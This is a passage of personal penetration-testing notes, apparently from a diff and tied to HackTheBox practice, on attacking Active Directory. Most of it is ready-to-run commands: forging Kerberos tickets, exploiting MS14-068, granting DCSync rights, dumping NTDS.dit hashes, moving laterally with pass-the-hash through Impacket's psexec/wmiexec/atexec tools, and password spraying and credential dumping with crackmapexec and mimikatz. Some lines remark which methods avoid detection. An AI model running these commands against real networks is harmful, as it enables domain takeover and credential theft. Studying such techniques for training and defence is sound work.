+					kerbros::golden /sid:domain_sid /domain:domain.local /target:service_host:port /service:service_name /rc4:NTLM /user:user1234 /ptt
+						/ptt => loads the ticket into memory after creating it
+				Using the ticket depends on which service we have compromised:
+					https://pentest.racko.sk/active-directory/persistence/silver-ticket
+		OverPass-the-Hash:(pass the key)
+			This attack aims to use the user NTLM hash to request Kerberos tickets
+			This could be especially useful in networks where NTLM protocol is disabled and only Kerberos is allowed as authentication protocol.
+			Using Rubeus:
+				.\Rubeus.exe asktgt /domain:domain.local /user:user1234 /rc4:ntlm /ptt
+		MS14-068:(Microsoft Kerberos Checksum Validation Vulnerability)
+			The MS14-068 flaw in Kerberos allows a regular authenticated domain account to elevate permissions to compromise an entire domain
+			Used in HTB::Mantis
+			Requirements:
+				user sid
+				user name
+				user password
+			To check if DC is vulnerable to MS14-068:
+				FindSMB2UPTime.py:
+					https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py
+					FindSMB2UPTime.py <ip>
+			Exploitation:
+				goldenpac.py:(part of Impacket-Toolkit)
+					Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target
+					edit /etc/hosts:
+						ip dc.domain.local domain.local
+					goldenPac.py domain.local/user:pass@dc.domain.local
+				Note:
+					No need to use pykek, instead use goldenpac.py	
+	Abusing ACL/ACE:
+		WriteDACL:(Write Permissions for Discrietionary Access Control List)
+			If a user has DACL write permissions, then the user can grant himself any privileges he want
+			We want to grant dcsync rights to user as dcsync rights makes user act as DC admin
+			powerview.ps1:
+				. ./powerview.ps1
+				$pass = Convertto-securestring 'password' -AsPlainText -Force 
+				$cred = New-Object System.Management.Automation.PSCredential('domain\username'.$pass)
+				Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity username -Rights DCSync
+	Dumping NTDS.dit:
+		DCSYNC Attack:
+			used in HTB::sauna
+			Secretsdump.py:
+				dumps hashes of SAM/LSA/DPAPI/other stuff
+				Remotely:
+					Secretsdump.py domain/user@ip -hashes => using lm hash
+					secretsdump.py domain/user:pass@ip => using pass
+					we need admin creds to dump ntds.dit
+				Locally:
+					It means we provide ntds.dit and SYSTEM file (in case of AD)
+						secretsdump -system SYSTEM -ntds ntds.dit local`
+	Pass The Password:(PTP)
+		winexe:
+			winexe -U 'domain/user%pass' //ip 'cmd.exe /c command'
+		psexec:
+			psexec user:pass@ip
+	Pass The Hash:(PTH)
+		we pass the NT:LM hash
+		pth-winexe:
+			pth-winexe -U user%hash //ip cmd.exe
+			it requires RDP
+	Tools for Remote Execution:
+		Can be used in ptp/pth
+		psexec:
+			psexec.py requires creds of a user having local admin or higher privileges because it requires read/write access to ADMIN$ share as it uploads a service binary (RemComSvc utility) with an arbitrary name to give shell
+			Uses port TCP/445
+			Working:
+				1. Copy a service binary to the ADMIN$ share over SMB
+				2. Create a service on the remote machine pointing to the binary
+				3. Remotely start the service
+				4. When exited, stop the service and delete the binary
+			Psexec.py gets detected easily and is often caught by the defender
+			Usage:
+				psexec.py user:password@192.168.1.2
+				psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c user@192.168.1.2 cmd.exe
+				psexec.py domain/username:password@hostIP
+			meta-commands:
+				get => to download
+				put => to upload
+		smbexec.py:
+			Smbexec.py creates a batch file for each command that you run, then creates a service to run the file using cmd.exe, instead of uploading an executable(like psexec.py)
+			Uses port TCP/445
+			This script works in two ways:
+				share mode: 
+					we specify a share, and everything is done through that share.
+				server mode:(by default)
+					if for any reason there’s no share available, this script will launch a local SMB server, so the output (both STDOUT and STDERR) of the commands executed is sent back by the target machine into a locally shared folder. To use this mode, we need to run this script with SUDO privileges as it needs to open the local port 445 on kali.
+			This generates a lot of windows event logs since you’re creating and deleting a lot of services, but it still tends to be detected less frequently than psexec.py.
+			Unlike Psexec.py, smbexec.py does not have 'get' and 'put' commands.
+			Since it’s not an interactive shell, it’s important to be careful what commands you run and how you run them. If you have to run PowerShell commands then you should build one-liners, otherwise smbexec.py will hang.
+			Usage:
+				smbexec.py domain/username:password@hostIP
+		atexec.py:
+			atexec.py uses the Task Scheduler service (Atsvc) on the remote Windows system to execute a supplied command.
+			Uses port TCP/445
+			atexec.py dont gives a shell, instead, it allows you to execute some command or one-liner as the NT Authority\System user, and then sends the output back to you.
+			Usage:
+				atexec.py domain/username:password@hostIP command
+				atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "Administrator"@192.168.204.183 "whoami"
+				atexec.py "Administrator:pass123"@192.168.204.183 "whoami"
+		wmiexec.py:
+			wmiexec.py uses the WMI and DCOM to create a windows process to run commands and it writes the output out to a temp file in an SMB share ( ADMIN$ by default) and then retrieves the output and deletes the file.
+			Uses port TCP/135, TCP/445, TCP/50911(winmgmt)
+			Wmiexec.py dont get detected easily since it dont generate a lot of windows event logs about services being created.
+			Like psexec.py, wmiexec.py supports the put and get commands to upload and download files
+			Usage:
+				wmiexec.py domain/username:password@hostIP
+		dcomexec.py:
+			dcomexec.py uses various DCOM endpoints such as MMC20.Application, ShellWindows or ShellBrowserWindow objects to spawn a semi-interactive shell on target system.
+			Uses port TCP/135, TCP/445, TCP/49751(DCOM)
+			Usage:
+				dcomexec.py "Administrator:pass123"@192.168.204.183
+				dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "Administrator"@192.168.204.183		
+Persistence:
+	DCShadow:
+		Becoming a Rogue Domain Controller
+		DCShadow allows an attacker with enough privileges to create a rogue Domain Controller and push malicious changes to AD
+		Requirements:
+			Two shells are required:
+				one running with SYSTEM privileges
+				one running with privileges of a domain member that is in Domain admins group
+Crackmapexec:
+	Crackmapexec is used to do password spraying attack and To confirm passowords/hashes.
+	Basics:
+		crackmapexec <protocol> <ip> [-u 'user'] [-p 'pass'] [-H hash] [-d domain] {options}
+			Protocols => LDAP/SSH/SMB/WINRM/MSSQL
+	Note:
+		crackmapexec allows ipv6:
+			dont use ip, instead use domain_name
+	To check the password/hash:
+		crackmapexec smb domain.local -u 'username' -p 'pass' #ptp
+		crackmapexec smb domain.local -u 'username' -H hash #pth
+	remote code execution:
+		crackmapexec smb ip -u 'user' -p 'pass' -x 'command`'
+		execution methods:
+			crackmapexec smb ip -u 'user' -p 'pass' -x 'command' --exec-method atexec => it executes command using Task Scheduler service
+			--exec-method wmiexec => executes using WMI service
+	enumeration:
+		Crackmapexec smb ip -u 'username' -p 'pass' --users => users
+		Crackmapexec smb ip -u 'username' -p 'pass' --groups => groups
+		Crackmapexec smb ip -u 'username' -p 'pass' --shares => shares
+		--pass-pol => password policy
+		--disks => disk drives
+	bruteforcing:
+		username and password bruteforcing:
+			crackmapexec smb ip -u user.txt -p pass.txt
+	password spraying:
+		using a password against many users
+		crackmapexec smb ip -u user.txt -p 'Pass' --rid-brute
+		crackmapexec smb ip -u user.txt -p 'Pass' --continue-on-success
+	credential dumping:
+		Crackmapexec smb ip -u 'username' -p 'pass' --sam => sam file
+		--lsa => lsa file(LSA => Local Security Authority)
+		--ntds drsuapi => ntds file
+		--ntds vss => another way to dump ntds file
+	Modules:
+		crackmapexec smb -L => list all modules
+		mimikitaz:
+			crackmapexec smb ip -u 'user' -p 'pass' -M mimikatz -o COMMAND='privilege::debug'
